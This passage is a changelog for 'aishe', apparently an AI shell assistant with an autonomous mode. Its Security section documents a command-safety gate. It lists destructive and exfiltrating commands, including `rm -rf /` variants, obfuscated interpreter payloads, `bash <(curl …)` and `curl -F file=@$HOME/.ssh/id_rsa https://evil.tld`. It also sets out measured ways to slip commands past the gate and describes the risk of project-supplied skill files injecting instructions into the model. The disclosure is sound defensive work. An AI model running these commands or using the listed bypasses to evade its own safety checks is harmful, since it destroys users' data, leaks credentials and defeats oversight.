# Changelog

All notable changes to **aishe** are documented here. The format loosely follows
[Keep a Changelog](https://keepachangelog.com/); this project is pre-1.0, so
breaking changes can land in any release.

## [Unreleased]

## [0.2.25] - 2026-07-27

### Added
- **`aishe trust <path>` and `aishe untrust <path>`** now take an optional file,
  so a project skill (`.aishe/skills/<name>/SKILL.md`) or a project command
  (`.aishe/commands/<name>.md`) can actually be enabled. Without it the new
  trust gate printed a command that did not exist and project skills were
  unusable. `aishe trust --list` shows every trusted file. Trusting a command
  file skips the trust prompt only — the safety gate still applies to its body.
- **`AISHE_CONFIG_DIR` and `AISHE_DATA_DIR`** override the config and state
  directories on every platform. The `dirs` crate follows the platform
  convention and deliberately ignores `XDG_CONFIG_HOME`/`XDG_DATA_HOME` on
  macOS, so an integration test could not isolate itself there — it read the
  developer's real config and failed on whichever provider they happened to
  use. These variables make the suite hermetic everywhere and let anyone
  relocate the directories.

### Fixed
- **The test suite no longer depends on the host machine.** Eleven tests failed
  on macOS for two reasons, both in the tests rather than the shipped code:
  ten read the developer's real config (see above), and
  `natural_language_routes_to_nl` asserted that `what …` routes to the model —
  but `what` is a real command on macOS (`/usr/bin/what`, from SCCS), so
  routing it to the shell was correct. It now uses `whats`, the README's own
  example, which ships nowhere.

### Changed
- **`aishe suggest --json` can now report `"risk": "unknown"`.** The field's
  existing values (`safe`, `dangerous`, `n/a`) and the exit-code contract
  (`0`/`20`/`1`) are unchanged: an unknown-risk command exits `20`, the same as a
  dangerous one, because `20` already means "flagged — do not auto-run, pre-fill
  for review". Consumers that test `risk == "safe"` therefore keep failing closed
  without any change.
- **Custom commands: project commands no longer silently overwrite same-named
  user commands.** Command loading is now user-first with `or_insert`, so a
  project command (`<cwd>/.aishe/commands/*.md`) can no longer shadow a
  same-named user command (`~/.config/aishe/commands/*.md`) — the user's own
  command always wins. Previously a cloned repo's project command could override
  a user command by name.

### Security
- **Safety gate: it now fails closed on a segment whose head it cannot resolve.**
  `assess` gained a third verdict, `Risk::Unknown(reason)`, returned when a
  segment's command name is not knowable without running the line — the head is a
  computed expansion (`$(which rm) -rf /`, `` `which rm` -rf / ``,
  `${RM:-rm} -rf /`), a leftover option flag (`-rf /etc`), a bare redirection
  token, or a fragment that cannot be a command name at all. All of those
  previously returned `Safe` and ran with no prompt. Unknown confirms in auto/yolo
  (a milder yellow "could not verify" panel, satisfiable with `y/N` rather than
  typing `yes`), is never re-run for diagnostics (`fix.rs`), and is skipped by
  `runbook --replay`. It is *narrow* by construction: it means "I could not
  resolve the head", **not** "this command is not on a denylist" — every
  well-formed command name, including ones the gate has never heard of (`uv`,
  `bun`, `mise`, `g++`, `docker-compose`, `./scripts/deploy.sh`), stays `Safe`,
  and so does ordinary shell syntax (see *Fixed*, below).

- **Scope of the gate changes below — read this before trusting them.** These
  fixes close specific, enumerated bypasses; they do not make the gate sound. It
  is still a heuristic denylist of command names and wrapper words matched with
  regexes over a normalized string, not a shell parser, and it remains bypassable.
  A command whose head resolves to a well-formed name the denylist doesn't know is
  still `Safe`. Failing closed on an unresolvable head narrows the hole, it does
  not close it: an attacker who can choose the spelling can pick a resolvable one.
  The gate is a heuristic speed bump against mistakes, not a security boundary and
  not an authoritative verdict. For autonomous or untrusted use, raise
  `yolo_confirm` and/or use `sandbox_backend = "bwrap"` (or `aishe dry-run`),
  which is the real control.

  Measured residual as of this release — each of these was run through `assess`
  and is **not** flagged `Dangerous`:
  - **Runners outside the capped table** (see below) hide their payload
    completely: `cargo run -- rm -rf /`, `mise exec -- rm -rf /`,
    `asdf exec rm -rf /`, `conda run rm -rf /`, `pixi run rm -rf /`,
    `devbox run rm -rf /`, `lxc exec ctr -- rm -rf /`, `systemd-run rm -rf /`,
    `deno task nuke`, `bun run nuke`, `just`/`make`/`rake`/`gradle` targets — all
    `Safe`.
  - **Opaque pipe sources** into a shell are `Unknown`, not `Dangerous`:
    `cat deploy.sh | sh`, `base64 -d payload.b64 | bash`,
    `gpg -d payload.gpg | bash`, `aws s3 cp s3://b/k - | bash`. The gate cannot
    know what the left side emits until it runs, so it prompts rather than
    judging.
  - **Obfuscated interpreter payloads** defeat the substring scan:
    `python3 -c "exec(__import__('base64').b64decode('cm0gLXJmIC8='))"`,
    `perl -e 'system(pack("H*","726d202d7266202f"))'`,
    `php -r 'system(strrev("/ fr- mr"));'`, `awk 'BEGIN{system("rm -rf /")}'` —
    all `Safe`. Only *literal* destructive text in the payload is caught.
  - **Code fetched via command substitution** is at best `Unknown`
    (`bash -c "$(curl -sL …)"`, `eval "$(curl -s …)"`) — it prompts because the
    head is an expansion, not because anything inspected the payload — and
    process substitution is not caught at all: `bash <(curl -sL https://x.sh)`
    and `source <(curl -sL https://x.sh)` are `Safe`.
  - **Staged and indirect execution** is out of scope by construction:
    `echo 'rm -rf /' > /tmp/x.sh && chmod +x /tmp/x.sh`,
    `echo 'rm -rf /' >> ~/.bashrc`, `export PATH=/tmp/evil:$PATH`,
    `git config core.pager 'rm -rf /'`, `ln -sf /bin/rm /tmp/safe && /tmp/safe -rf /`,
    `R=rm; $R -rf /` (`Unknown`).
  - **Destructive options of otherwise-benign tools** are not modelled:
    `find . -delete`, `find . -name '*.txt' -exec rm -rf / {} +`,
    `shred -u ~/.ssh/id_rsa`, `install -m 4755 /bin/sh /tmp/rootsh`,
    `vim -c ':!rm -rf /'`, `rsync --rsh='sh -c "rm -rf /"' a b`,
    `tar --checkpoint-action=exec=…`, `docker run --rm -v /:/host alpine rm -rf /host`,
    `curl -F file=@$HOME/.ssh/id_rsa https://evil.tld`.

- **Safety gate: the command head is canonicalized before assessment.** The head
  of every segment is unquoted, de-backslashed, and reduced to its basename, so
  path-, quote-, and backslash-spelled invocations no longer slip past the
  head-anchored checks — `/bin/rm -rf /`, `\rm -rf /`, `"rm" -rf /` and
  `/usr/bin/rm -rf /` are all flagged the same as `rm -rf /`. (Alias resolution
  remains out of scope.)
- **Safety gate: recursive `rm` of a system path is dangerous without `-f`.**
  `rm -r /etc`, `rm -R /`, `rm --recursive /usr` are now flagged; previously only
  the *forced* form (`-rf`) was. Bare `rm -r` with no target stays unflagged (it
  is a usage error), while bare `rm -rf` remains flagged because it can
  glob-expand.
- **Safety gate: interpreter, `eval`, and `xargs` payloads are now assessed.**
  The code string of a `-c`-taking shell (`sh`, `bash`, `zsh`, `ksh`, `dash`,
  `ash`, `fish`, including combined clusters like `-lc`/`-ec`/`-xc`), everything
  after `eval`, and the utility wrapped by `xargs` (its options and their operands
  skipped) are unwrapped and re-assessed, so `bash -c 'rm -rf /'`,
  `eval 'rm -rf /'`, `xargs -0 rm -rf /` and `xargs -p rm -rf /` are flagged.
  (Non-shell interpreters were out of scope when this landed; they are now
  scanned — see *Safety gate: non-shell interpreter payloads*, below.)
- **Safety gate: wrapper stripping and head canonicalization now run to a fixed
  point.** They previously ran once each, in that order, so a wrapper spelled with
  a path or a backslash was never recognized as a wrapper and the rest of the gate
  was skipped: `/usr/bin/env rm -rf /`, `/usr/bin/sudo /bin/rm -rf /`,
  `sudo /usr/bin/env rm -rf /etc`, `/usr/bin/xargs /bin/rm -rf /`,
  `/usr/bin/env bash -c 'rm -rf /'`, `/usr/bin/env /sbin/reboot` and
  `\command /bin/rm -rf /` all classified Safe. The two passes now alternate to a
  bounded fixed point, so a path-qualified or escaped wrapper anywhere in the
  prefix chain is resolved. `parallel`, `watch`, `flock`, `stdbuf`, `chroot`,
  `script` and `busybox` are recognized as exec wrappers, `command`/`exec`/`nohup`
  consume their own options, `xargs` handles its long forms, compound-statement
  keywords (`do`, `then`, `else`, `{`, `!`) are stripped, and newlines are kept as
  segment boundaries — so `parallel rm -rf /`, `flock /tmp/lock rm -rf /`,
  `ls\nrm -rf /` and `for f in *; do rm -rf /; done` are flagged.
- **Safety gate: more interpreter payload spellings are assessed.** A `-c` cluster
  now counts when `c` appears anywhere in it (`bash -cx '…'`, not just `-lc`/`-ec`),
  leading flags and `--` after `-c` are skipped (`bash -c -- 'rm -rf /'`),
  `su -c`/`runuser -c`/`script -c`/`busybox sh -c` are treated as code-running
  interpreters, `fish --command` is recognized, and a here-string operand
  (`bash <<< 'rm -rf /'`) is assessed like a here-doc body. `rm`'s long options are
  matched by unambiguous prefix as GNU getopt accepts them, so `rm --recu /etc`,
  `--rec`, `--r` are flagged.

- **Safety gate: here-doc bodies are delimited correctly, and a trailing comment
  can no longer leak a quote.** The here-doc opener scan did not understand
  comments, so a `<<WORD` appearing inside a `#` comment started a body that
  swallowed the real commands after it; and an unbalanced quote inside a trailing
  comment (`echo "a" # don't`) leaked into the tokenizer and corrupted the rest of
  the segment. Comments are now stripped quote-aware before the opener scan, so
  `ls # rm -rf /` stays `Safe` while a genuine `bash <<'EOF' … rm -rf / … EOF`
  body is still assessed and flagged.
- **Safety gate: redirect targets are checked anywhere in a segment, not just at
  its head.** A write to a system path was only noticed when the redirection led
  the segment, so `echo x > /etc/passwd` and `cmd 2>&1 >> /etc/sudoers` passed. Any
  `>`/`>>` target in the segment is now judged, and `tee` is treated as a writer of
  its operands — so `tee /etc/passwd` and `echo x | tee /etc/sudoers` are flagged.
- **Safety gate: `ssh [opts] host <cmd>` assesses the remote command.** The
  option-and-operand grammar (`-p`, `-i`, `-o`, `-l`, `user@host`, …) is walked so
  the remaining words are re-assessed as a command line: `ssh host 'rm -rf /'` and
  `ssh -p 22 -i k user@host rm -rf /` are flagged. This judges the *text being
  sent*; it says nothing about what the far end actually does with it.
- **Safety gate: `trap`, `alias` and `watch` quoted code is assessed.** All three
  take a shell-code string that is executed later, and all three previously hid it:
  `trap 'rm -rf /' EXIT`, `alias nuke='rm -rf /'` and `watch 'rm -rf /tmp/cache'`
  are now flagged.
- **Safety gate: a pipeline whose sink is a shell is judged by its source.** When
  the last stage is `sh`/`bash`/`zsh`/…, the upstream is examined: if it emits
  *literal* text the gate can read (`echo 'rm -rf /' | bash`), that text is
  assessed and the pipeline inherits the verdict; if the upstream is opaque
  (`cat deploy.sh | sh`, `base64 -d p.b64 | bash`) the result is
  `Risk::Unknown("a shell executes this pipeline's stdin")` so it fails closed
  instead of returning `Safe`. The pre-existing `curl … | bash` rule still fires
  with its own reason. Note the asymmetry: opaque sources prompt, they are not
  blocked.
- **Safety gate: non-shell interpreter payloads are scanned.** The code string of
  `python`/`python3`/`perl`/`node`/`ruby`/`php` (`-c`, `-e`, `-r`) is searched for
  a destructive shell-out, so `python3 -c "import os; os.system('rm -rf /')"`,
  `perl -e 'system("rm -rf /")'`, `node -e "…execSync('rm -rf /')"` and
  `ruby -e 'system("rm -rf /")'` are flagged. **This is a substring scan, not a
  parser for six languages.** Any payload that constructs the command rather than
  spelling it out — base64, `pack`, `strrev`, string concatenation — is *not*
  caught, and `awk 'BEGIN{system("rm -rf /")}'` is not covered at all. See the
  measured residual above.
- **Safety gate: a capped table of runner binaries is unwrapped.** `uv run`,
  `poetry run`, `pipenv run`, `rye run`, `pdm run`, `hatch run`, `bundle exec`,
  `npm exec`, `pnpm exec`, `yarn exec`, `npx`, `docker exec`, `kubectl exec`,
  `nix-shell --run` and `direnv exec` now expose the command they wrap, so
  `uv run rm -rf /` and `kubectl exec pod -- rm -rf /` are flagged. `npm`/`pnpm`/
  `yarn` **`run`** is deliberately *not* unwrapped: its operand is a `package.json`
  script name, not a command line, and the gate cannot see the script's body.
  **This table is deliberately incomplete and will not converge** — there is always
  another `foo exec`. It covers the dozen a developer actually types; everything
  else (`cargo run --`, `mise exec`, `conda run`, `just`, `make`, …) still hides
  its payload. The sandbox, not this list, is the control over what a wrapped
  command can reach.
- **`shell:true` custom commands from a project directory are now gated.** A
  project-origin `shell:true` command must be trusted (`aishe trust <file>`) or
  explicitly confirmed — the resolved shell command is shown first — before it
  runs, and the resolved body passes through the standard safety gate. User-origin
  commands still run without friction. The preview escapes control characters, so
  a body cannot repaint the line to show a command other than the one that runs.
- **Custom commands: an untrusted project `mode:` can no longer escalate.** Only
  `shell: true` bodies were gated; a cloned repo's `mode: yolo` frontmatter took
  the other branch straight into the agentic loop with no trust prompt, and
  `mode: auto` was the same escalation one notch weaker. An untrusted project
  command's `mode:` is now ignored when it ranks above the user's configured mode
  (a notice is printed); de-escalation, and any user-authored override, are still
  honored.
- **Skills: a project skill can no longer shadow a user skill, and is trust-gated.**
  A skill body is fed to the model verbatim as instructions, and project skills
  (`<cwd>/.aishe/skills/`) ride along in any cloned repository — yet they
  previously overrode same-named user skills by load order and were loaded with no
  trust check at all. Loading is now user-first with `or_insert` (the user's own
  definition always wins), and a project skill whose file is not trusted
  (`aishe trust <file>`) is dropped from the registry entirely: not listed, not in
  the catalog, not loadable via `use_skill`. The gate is at load rather than at
  use because the model pulls a skill in mid-loop, where there is no user-facing
  moment to confirm at. Dropped files are reported so the user can trust them
  deliberately.

### Fixed
- **Safety gate: shell syntax no longer prompts.** Failing closed on an
  unresolvable head, as first written, returned `Unknown` for 22% of everyday
  developer commands — at that rate the confirmation becomes reflexive and the
  gate is worth nothing. Heads that are shell *syntax* rather than command names
  are now recognized as resolved and stay `Safe`: test brackets
  (`[ -f Cargo.toml ] && cargo build`, `[[ -z "$CI" ]] && npm test`), dot-source
  (`. venv/bin/activate`), `:`, brace groups (`{ echo a; echo b; }`), function
  headers (`deploy() { … }`), `case` arm labels and the `;;`/`esac`/`fi`/`done`
  terminators, bare assignments (`VERSION=1.2.3`), comment and shebang lines,
  option-only wrappers (`env`, `sudo -v`), `exec 3>&1`, a leading redirect with
  the command after it (`< input.txt sort`), a `$VAR`/`"$SHELL"` head, and a
  trailing `;`. Three more shapes were `Unknown` only because the tokenizer lost
  the real head; they now resolve to the *correct* verdict instead of a prompt — a
  quoted env value containing a space (`CFLAGS="-O2 -Wall" make` Safe,
  `LDFLAGS="-L/usr/lib -lm" rm -rf /` Dangerous), a leading redirect judged by its
  target (`> build.log` Safe, `> /etc/passwd` and `2>/dev/null rm -rf /etc`
  Dangerous), and `watch`'s interval operand (`watch -n 5 kubectl get pods` Safe,
  `watch -n 5 rm -rf /tmp/cache` Dangerous). `env -S`/`--split-string` is also now
  unwrapped as a command line. None of this makes the syntax a hiding place:
  `{ echo a; rm -rf /; }`, `case $1 in start) rm -rf / ;; esac` and a dangerous
  line following a comment line are still flagged, and no `Dangerous` verdict in
  the safety corpus was downgraded.
- **Safety gate: six families of everyday false positives.** `chmod`/`chown`/
  `chgrp` no longer treat the mode or owner operand as a path (`chown -R $USER
  ~/.npm` — npm's own documented EACCES remedy — and `chmod -R 755 ~/bin` were
  flagged on `$USER`/`755`); `$PWD/…`, `${PWD}/…`, `$OLDPWD/…` and `$TMPDIR/…`
  are in-tree/scratch by definition, so `rm -rf "$PWD/build"` is allowed while
  `$HOME`/`~` stay dangerous (the rule is per-variable); `/tmp/x` and `/var/tmp/x`
  are user scratch for `mv`/`dd`/`truncate` (bare `/tmp` still is not); an
  ordinary non-dot path under `$HOME` can be moved (`mv ~/Downloads/report.pdf
  ./docs/`) while `~/.config`, `~/.ssh` cannot; and a recursive permission change
  anywhere under the user's home — dot-dirs included — is theirs to make.
- **Safety gate: `env -u NAME <cmd>` no longer hides `<cmd>`.** `-u`/`--unset`
  did not consume its operand, so the variable name became the segment head and
  `env -u LD_PRELOAD rm -rf /` classified as `Safe`.
- **Command output is no longer truncated or stalled by non-UTF-8 bytes.** The
  stdout/stderr drainer reads raw bytes and decodes each line lossily; previously
  the UTF-8-only line iterator treated the first invalid-UTF-8 line as EOF, which
  dropped the rest of the output and could fabricate a timeout. The same
  byte-oriented, lossy read is now used by the MCP stdio transport and the
  provider SSE stream readers, which had the identical bug: a single invalid byte
  in a tool result or a streamed token ended the read early and looked like a
  closed connection.
- **Captured command output is bounded while it is being read.** Output
  truncation only ran *after* the stream ended, so a command that produced
  unbounded output (`yes`, `cat /dev/urandom`) grew the capture buffer until the
  process died. The drainer now keeps a bounded FIFO tail — a byte budget, a
  per-line ceiling so one enormous line cannot grow a single allocation without
  limit, and a line-count cap so a flood of *blank* lines cannot cost a quarter-
  million `String` allocations inside the byte budget — and records that eviction
  happened, so the joined text says it was truncated rather than silently
  presenting a tail as the whole. All three limits sit far above what survives the
  existing post-run truncation, so no sane command's reported output changes.
- **Shell probing at startup no longer deadlocks on a chatty `.zshrc`.** The
  builtin/alias probe polled `try_wait()` and only collected output after exit.
  An OS pipe buffer is ~64 KiB, so a plugin-heavy shell profile that printed more
  than that blocked in `write(2)` forever, the child never exited, and the timeout
  killed a probe that had already produced its answer — leaving the session with
  no aliases or builtins. Stdout is now drained concurrently on its own thread,
  discarding past a cap so the child still reaches EOF, with a bounded join so a
  forked grandchild holding the write end open cannot hang startup. A genuinely
  hung child is still killed and still reported as a failure.

## [0.2.24] - 2026-06-13

### Added
- **`aishe suggest "<request>" [--json]`** — a documented, stable scripting
  interface: turns a natural-language request into a shell command on stdout, with
  an exit-code contract (0 = safe command / answer, 20 = flagged dangerous but
  still printed, 1 = no provider / empty). `--json` emits
  `{kind, command, explanation, risk, reason}` for `jq` pipelines.
- **`aishe man`** — emits a native roff man page (clap_mangen). Installed by
  `install.sh` (best-effort), the `.deb`/`.rpm`, and the Homebrew formula.
- **Quickstart** in the README ("Get productive in 60 seconds").
- `CONTRIBUTING.md`, and a `docs/design/` home for the PRD/PLAN design docs.

### Changed
- **Hardening:** lock-poison recovery in the command dispatcher, executor
  output-capture, and the provider fallback chain (a panicked worker thread can no
  longer cascade into a shell crash); the fallback chain's `unreachable!` is now a
  graceful error. `history.ext` is trimmed once it passes 4 MB, so it can't grow
  unbounded outside the interactive-exit cap. Trivial commands (`exit`, bare
  `cd`/`ls`, …) are excluded from semantic-history indexing.
- `aishe doctor --probe` now also probes the embedding endpoint when
  `semantic_history` is enabled.
- The macOS parity of the reversibility/sandbox features (`dry-run`,
  `yolo_dry_run`; Linux + bubblewrap only) is now called out explicitly in the docs.
- **CI:** a dedicated MSRV (1.80) build job, and the opt-in `real_fuzz.py`
  real-model robustness fuzz is wired in. `test-results/` run artifacts are no
  longer committed (gitignored). crates.io metadata (`homepage`/`documentation`)
  added; the crate verifies publishable via `cargo publish --dry-run`.

## [0.2.23] - 2026-06-13

### Fixed
- **Safety gate now handles here-documents.** A here-doc body fed to a shell
  (`bash <<EOF … rm -rf / … EOF`, `cat <<EOF | bash`, `ssh host <<EOF`) is assessed
  as commands — closing an evasion where the dangerous body slipped past the
  head-anchored checks. A body written verbatim by `cat`/`tee` is treated as data,
  so writing a script/config whose *content* resembles a dangerous command (an
  install script containing `curl … | sh`, a fork-bomb string) no longer trips a
  false positive. Safe-by-construction: a body is only treated as data for a simple
  `cat`/`tee` line with no operator that could route it to an interpreter. Completes
  proposal R3.

## [0.2.22] - 2026-06-13

### Fixed
- **Safety gate now sees inside process substitution.** A dangerous command
  hidden in `<(…)` / `>(…)` — e.g. `cat <(rm -rf /)`, `tee >(rm -rf /)` — was
  classified safe because the benign `cat`/`tee`/`diff` head masked it. The gate
  now recursively assesses process-substitution bodies (alongside the existing
  `$(…)`/backtick command-substitution recursion), closing the evasion. Benign
  process substitutions (`diff <(sort a) <(sort b)`) stay safe; corpus regression
  tests added. Part of proposal R3.

## [0.2.21] - 2026-06-13

### Added
- **Reversible yolo session (`yolo_dry_run`).** With this on, a whole yolo session
  runs against a throwaway copy of the working tree (under bubblewrap — read-only
  root, no network), and the cumulative file diff is shown at the end to apply or
  discard. Interactive runs prompt; non-interactive (`-c`) runs auto-apply,
  journaled so `aishe undo` reverts the entire batch. So an entire autonomous
  session — not just the built-in file tools — is reversible. Off by default; needs
  bubblewrap (degrades to a normal run when absent). This is proposal N2's overlay
  preview wired into the loop, building on the `aishe dry-run` primitive.

## [0.2.20] - 2026-06-13

### Added
- **`aishe dry-run --apply` is now undoable.** Applying a previewed change set
  journals each file's pre-image, so `aishe undo` reverts the whole batch — closing
  the **preview → apply → undo** loop. Binary changes still apply but aren't
  undoable (the text journal can't store them), matching the file tools.

## [0.2.19] - 2026-06-13

### Added
- **Reversible command preview (`aishe dry-run "<cmd>"`).** Runs a command against
  a throwaway copy of the working tree under bubblewrap — a read-only root with
  the network disabled — so the command really executes but its writes are
  confined to the copy and it has no external side effects. aishe then diffs the
  copy against the real tree and shows the added/modified/deleted files with
  unified diffs; the changes are discarded by default, or kept with `--apply`.
  Needs `bubblewrap` (Linux; `aishe doctor` reports availability) and refuses very
  large trees (it copies, since there's no kernel overlay). This is the first
  slice of proposal R2's overlay backend and the building block N2 (plan → preview
  → apply/undo) grows into.

## [0.2.18] - 2026-06-13

### Added
- **Stderr context for the fix key (`fix_capture_stderr`).** When on, the
  fix-the-last-command key (Ctrl-X Ctrl-F) re-runs a *read-only, safe* failed
  command once to capture its actual error output and feeds it into the correction
  prompt, so the model fixes the real error ("unknown option", "no such file",
  "not a git repository") rather than guessing from the command text. Off by
  default; only commands the safety gate classifies read-only and safe are ever
  re-run (bounded by a timeout), so a destructive or network command is never
  re-executed, and the diagnostic run uses a throwaway executor that doesn't touch
  recorded history. The fix widget now delegates to a tested `--fix-line` hook
  helper (`src/fix.rs`). This is the stderr-tail follow-up to proposal N1.

## [0.2.17] - 2026-06-13

### Added
- **Automatic semantic-index refresh (`semantic_history_autoindex`).** When on,
  the interactive shell re-runs the incremental `history index` on exit, so newly
  run commands are searchable next session without a manual `aishe history index`.
  Off by default (it embeds new commands on the provider — free with a local
  Ollama, metered on a paid API); requires `semantic_history`. This completes
  proposal N4. The indexing core was extracted into a shared, tested module
  (`src/index.rs`) used by both the CLI command and the auto-index.

## [0.2.16] - 2026-06-13

### Fixed
- **Command history is now actually recorded**, so `aishe history` and semantic
  history search (`aishe history index`/`search`, the `Ctrl-X Ctrl-R` recall key)
  have real data. Previously aishe's timestamped history log was only ever read,
  never written: the interactive PTY's commands run in real zsh (not through
  aishe's executor), and the executor's `-c`/hook path never persisted either, so
  the log stayed empty and indexing found nothing. Now the PTY records each command
  via a `preexec` hook (`AISHE_HISTFILE`) and the executor persists `-c`/hook
  commands, both in zsh `EXTENDED_HISTORY` format. History-management commands
  (`history`/`fc`) are excluded, and the log is capped on shell exit. This makes
  proposal N4 functional end-to-end.

## [0.2.15] - 2026-06-13

### Added
- **Project-root-aware task discovery + richer host facts** (context block). The
  project-tasks block now walks up from your cwd to the repo root (nearest
  `.git`), so "run the tests" still resolves to the project's real command when
  you're in a subdirectory — and a subdirectory with its own task surface takes
  precedence (the resolved root is noted when it differs from your cwd). The
  host-profile block adds a `Host facts:` line with the **init system**
  (`systemd`/`openrc`/`launchd`/`sysvinit`, so service control is right) and the
  **active Kubernetes context** (local kubeconfig only, no cluster contact). Both
  under the existing `project_tasks` / `host_profile` toggles. Follow-up to
  proposal N3.

## [0.2.14] - 2026-06-13

### Added
- **Provider reachability probe (`aishe doctor --probe`).** Actively checks each
  member of the provider chain with one short, read-only `GET /v1/models` (no
  completion, so it costs no tokens) and reports **reachable**, **reachable but
  key rejected** (401/403), or **unreachable** (connection refused / timeout) —
  making the offline/fallback story (e.g. a local Ollama) verifiable. An
  unreachable member is a warning, not a failure, so `doctor` still passes
  offline. This is the reachability-probe follow-up to proposal R4.

## [0.2.13] - 2026-06-13

### Added
- **Whole-session usage summary.** The interactive zsh front-end runs each
  natural-language line as its own process, so on exit aishe now prints one dim
  line totalling the session — `aishe session: 18,204 in · 5,130 out · 9 reqs ·
  ~$0.0731` — alongside the existing per-call lines. Children append their metered
  usage to a shared per-session tally (`AISHE_USAGE_FILE`); the parent aggregates
  cost per model (unpriced models disclosed as `(+N unpriced)`) and prints it.
  Gated on `show_usage`; shown only when at least one model call was made. This is
  the post-session summary follow-up to proposal R5.

## [0.2.12] - 2026-06-13

### Added
- **Semantic-recall keybinding (Ctrl-X Ctrl-R).** With `semantic_history`
  enabled, type a few words describing a past command and press **Ctrl-X Ctrl-R**
  in the zsh front-end to replace the line with the closest past command by
  meaning — pre-filled for review, never auto-run. Override with
  `AISHE_RECALL_KEY`. Backed by a new `aishe history search --bare` mode (prints
  only the command, notices to stderr, empty stdout on no match) so the widget can
  assign the result straight to the line. This completes the interactive half of
  proposal N4 (the CLI shipped in 0.2.11); idle-time background indexing remains a
  follow-up.

## [0.2.11] - 2026-06-13

### Added
- **Semantic history search (`aishe history search`).** Opt-in
  (`semantic_history = true`) natural-language recall over your shell history:
  `aishe history index` embeds your past commands into a small, capped, local
  vector store (`history.vec`), and `aishe history search "the docker run with
  the prometheus volume"` returns the closest commands by *meaning*, not
  substring. Embeddings go through any OpenAI-compatible `/v1/embeddings`
  endpoint (`embedding_provider`/`embedding_model`), so a local Ollama keeps the
  whole feature offline — your history never leaves the machine. Indexing is
  incremental (re-running only embeds new commands) and the store is rebuildable
  with `--rebuild`. Off by default and silent until you index. Adds an `embed`
  capability to the provider trait (OpenAI-compatible impl; deterministic fake for
  tests). This is the first slice of proposal N4 from
  [docs/proposals.md](docs/proposals.md); an interactive pre-fill key binding is a
  planned follow-up.

## [0.2.10] - 2026-06-13

### Added
- **Preview-first file edits for yolo (`yolo_preview = true`).** When the yolo
  loop uses a built-in `write_file` or `edit_file`, show the unified diff and ask
  `apply this write/edit to <path>? [y/N]` *before* touching the file, instead of
  writing first and showing the diff after the fact. Declining leaves the file
  untouched; applied changes are still journaled for `aishe undo`. Off by default;
  applies to the file tools only and only interactively (a piped/`-c` run applies
  automatically, like the rest of the confirm UX). This is the first slice of
  proposal N2 from [docs/proposals.md](docs/proposals.md).

## [0.2.9] - 2026-06-13

### Added
- **Real OS sandbox for yolo (`sandbox_backend = "bwrap"`).** With
  `yolo_sandbox = true`, choose how it's enforced: `"policy"` (the best-effort
  string gate, default) or `"bwrap"` — when [bubblewrap](https://github.com/containers/bubblewrap)
  is installed, every `run_command` runs with a read-only root and only the working
  tree and `/tmp` writable, so it *physically cannot* modify the system. Degrades
  to the policy gate (with a notice) when `bwrap` is absent; `aishe doctor` shows
  the active backend. Linux-only. This is proposal R2 from
  [docs/proposals.md](docs/proposals.md).

## [0.2.8] - 2026-06-12

### Changed
- **Safety gate is now quote- and nesting-aware.** Command segmentation no longer
  splits on operators that sit inside quotes or `$( … )`/`( … )` groups, so a
  dangerous-looking *string* (`echo "step 1; rm -rf /tmp/foo"`) is no longer a
  false positive, while real boundaries (`ls && rm -rf /`) still split. Subshells
  are unwrapped and judged on their inner command (`(sudo rm -rf /)`), alongside
  the existing command-substitution recursion. The whole adversarial corpus stays
  green. This is proposal R3 from [docs/proposals.md](docs/proposals.md).

## [0.2.7] - 2026-06-12

### Added
- **Replayable runbooks (`aishe runbook`).** Turn a recorded yolo session into a
  committable `runbook-<id>.sh` (the exact commands, in order, with the request in
  the header) and `runbook-<id>.md` (a narrative: numbered steps with exit codes
  and the model's notes). Generated from the audit log after the fact
  (`--session`, `-o <dir>`); `--replay` re-runs the recorded commands through the
  safety gate (never the model) for deterministic reproduction. Secrets stay
  redacted. This is proposal N5 from [docs/proposals.md](docs/proposals.md).

## [0.2.6] - 2026-06-12

### Added
- **Project- and host-aware context.** The model context now automatically
  includes this repo's task surface (`justfile`/`Makefile` targets, `package.json`
  /`composer.json` scripts, `compose` services, Cargo/Python/CI markers) so "run
  the tests" maps to the project's real command, plus a one-line list of tools
  installed on `$PATH` so it proposes commands that exist on this host (`apt` vs
  `dnf` vs `brew`). Both are cached, capped, names-only (no secrets), toggled by
  `project_tasks` / `host_profile` (default on). New `aishe context` prints the
  full redacted block. This is proposal N3 from
  [docs/proposals.md](docs/proposals.md).

## [0.2.5] - 2026-06-12

### Added
- **Provider fallback chain + offline (`provider_fallback`).** List providers to
  try in order when the primary fails after its own retries — a dead endpoint,
  hard auth error, or blown budget degrades to a secondary (or a local Ollama)
  instead of failing. Usage is folded into one meter so cost/budget stay correct;
  `aishe doctor` shows the chain; a one-line notice prints once on fallback. A
  configured chain serves non-streamed (single providers stream as before). This
  is proposal R4 from [docs/proposals.md](docs/proposals.md).

## [0.2.4] - 2026-06-12

### Added
- **Queryable audit log + cost history (`aishe log`, `aishe usage`).** `aishe log`
  prints the audit log as a filtered table — by `--session`, `--action` (kind),
  `--model`, `--since` (`30m`/`2h`/`3d`/`1w`), `-n` last-N, or `--json` for raw
  JSONL. `aishe usage` aggregates token counts and estimated cost from the log,
  `--by model` (default), `day`, or `session`. Both are read-only and never
  un-redact (the log is already scrubbed on write). This is proposal R5 from
  [docs/proposals.md](docs/proposals.md).

## [0.2.3] - 2026-06-12

### Added
- **Fix-the-last-command key (error-driven autopilot).** When a command fails,
  press **Ctrl-X Ctrl-F** (override with `$AISHE_FIX_KEY`) to ask the model for a
  corrected command — it is pre-filled on your line for review and never
  auto-runs. Set `$AISHE_AUTODIAGNOSE=1` for a one-line hint after any failure.
  Works in both the zsh-PTY shell and the bash hook; the call is bounded by the
  same hook timeout, so it can't hang the prompt. This is proposal N1 from
  [docs/proposals.md](docs/proposals.md).

## [0.2.2] - 2026-06-12

### Added
- **Reversible AI file edits + `aishe undo`.** Every change the built-in file
  tools (`write_file` / `edit_file`) make in yolo is now shown as a unified diff
  and recorded to a journal (`$XDG_DATA_HOME/aishe/undo.jsonl`, override with
  `$AISHE_UNDO_JOURNAL`). `aishe undo` reverts the most recent run as a unit (in
  reverse order — a file created then edited is removed); `aishe undo --list` shows
  recorded change sets. Journaling is best-effort and never blocks a write. This is
  proposal R1 from [docs/proposals.md](docs/proposals.md).

## [0.2.1] - 2026-06-12

### Security
- **Safety gate closes several evasions.** Dangerous commands hidden inside
  command substitution `$(…)` or backticks are now inspected recursively; the
  `curl … | <shell>` check covers more interpreters (`zsh`/`ksh`/`dash`/`fish`,
  absolute paths, `python`/`perl`/`ruby`/`node`, `source`); and path-aware checks
  now catch `truncate` of a system file, `dd of=` to an out-of-tree file, and
  redirects into `/proc`//`sys`. (The gate is still defense-in-depth, not a
